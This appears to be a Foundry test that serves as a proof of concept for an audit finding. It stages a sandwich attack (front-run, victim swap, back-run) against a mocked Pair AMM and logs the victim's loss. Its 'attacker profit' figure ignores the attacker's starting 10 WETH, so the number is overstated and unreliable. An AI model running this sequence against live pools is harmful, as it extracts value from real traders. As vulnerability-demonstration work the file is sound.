// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test, console } from "@forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Constants } from "../helpers/Constants.sol";
import { Pair } from "../../contracts/Pair.sol";

contract PairH2Test is Test, Constants {
    address attacker;
    address victim;

    function setUp() public {
        usdc = address(new ERC20Mock());
        weth = address(new ERC20Mock());
        pair = new Pair(usdc, weth);

        // Setup liquidity
        address liquidityProvider = makeAddr("liquidityProvider");
        deal(usdc, liquidityProvider, 1000000 * 10 ** 6); // 1M USDC
        deal(weth, liquidityProvider, 500 * 10 ** 18); // 500 WETH

        vm.startPrank(liquidityProvider);
        IERC20(usdc).approve(address(pair), type(uint256).max);
        IERC20(weth).approve(address(pair), type(uint256).max);
        pair.addLiquidity(1000000 * 10 ** 6, 500 * 10 ** 18);
        vm.stopPrank();

        // Setup victim with some USDC to swap
        victim = makeAddr("victim");
        deal(usdc, victim, 10000 * 10 ** 6); // 10K USDC

        // Setup attacker with some USDC to front-run
        attacker = makeAddr("attacker");
        deal(usdc, attacker, 100000 * 10 ** 6); // 100K USDC
        deal(weth, attacker, 10 * 10 ** 18); // 10 WETH for initial balance
    }

    function test_SandwichAttack_VictimLosesValue() public {
        // Initial state
        uint256 victimUsdcAmount = 10000 * 10 ** 6; // 10K USDC

        // Calculate expected WETH output for victim without attack
        uint256 expectedWethOutput = pair.getAmountOut(usdc, weth, victimUsdcAmount);

        // 1. FRONT-RUN: Attacker executes a swap before the victim
        vm.startPrank(attacker);
        IERC20(usdc).approve(address(pair), 50000 * 10 ** 6);
        uint256 amountOut = pair.getAmountOut(usdc, weth, 50000 * 10 ** 6);
        pair.swap(usdc, weth, 50000 * 10 ** 6, amountOut); // Swap 50K USDC for WETH
        vm.stopPrank();

        // 2. VICTIM TRANSACTION: Victim's swap executes at worse price
        vm.startPrank(victim);
        IERC20(usdc).approve(address(pair), victimUsdcAmount);
        amountOut = pair.getAmountOut(usdc, weth, victimUsdcAmount);
        pair.swap(usdc, weth, victimUsdcAmount, amountOut);
        uint256 victimWethReceived = IERC20(weth).balanceOf(victim);
        vm.stopPrank();

        // 3. BACK-RUN: Attacker swaps back
        vm.startPrank(attacker);
        uint256 attackerWethBalance = IERC20(weth).balanceOf(attacker);
        IERC20(weth).approve(address(pair), attackerWethBalance);
        amountOut = pair.getAmountOut(weth, usdc, attackerWethBalance);
        pair.swap(weth, usdc, attackerWethBalance, amountOut);
        vm.stopPrank();

        // Verify victim received less than expected
        assertLt(victimWethReceived, expectedWethOutput);
        console.log("Victim expected WETH:", expectedWethOutput); // 4935790171985306494
        console.log("Victim actual WETH received:", victimWethReceived); // 4479652608862130724
        console.log("Value lost to sandwich attack:", expectedWethOutput - victimWethReceived); // 456137563123175770

        // Verify attacker profited
        uint256 attackerUsdcProfit = IERC20(usdc).balanceOf(attacker) - 50000 * 10 ** 6;
        assertTrue(attackerUsdcProfit > 0);
        console.log("Attacker profit in USDC:", attackerUsdcProfit); // 70552688938
    }
}
